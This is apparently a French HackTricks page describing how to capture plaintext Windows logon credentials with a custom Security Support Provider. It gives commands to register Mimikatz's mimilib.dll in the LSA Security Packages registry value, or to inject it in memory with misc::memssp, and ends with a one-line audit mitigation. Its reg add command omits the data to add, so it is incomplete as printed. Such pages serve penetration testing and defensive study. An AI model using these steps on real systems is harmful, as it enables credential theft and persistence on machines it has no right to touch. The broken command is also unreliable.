# SSP personnalisé

{{#include ../../banners/hacktricks-training.md}}

### SSP personnalisé

[Découvrez ce qu'est un SSP (Security Support Provider) ici.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Vous pouvez créer votre **propre SSP** pour **capturer** en **texte clair** les **identifiants** utilisés pour accéder à la machine.

#### Mimilib

Vous pouvez utiliser le binaire `mimilib.dll` fourni par Mimikatz. **Celui-ci enregistrera dans un fichier tous les identifiants en texte clair.**\
Déposez la DLL dans `C:\Windows\System32\`\
Obtenez la liste des packages de sécurité LSA existants :
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Ajoutez `mimilib.dll` à la liste des Security Support Providers (Security Packages) :
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Et après un redémarrage, tous les identifiants peuvent être trouvés en clair dans `C:\Windows\System32\kiwissp.log`

#### En mémoire

Vous pouvez également injecter ceci directement en mémoire à l’aide de `Mimikatz` (notez que cela peut être quelque peu instable/ne pas fonctionner) :
```bash
privilege::debug
misc::memssp
```
Cela ne survivra pas aux redémarrages.

#### Mesures d’atténuation

Event ID 4657 - Auditer la création/modification de `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
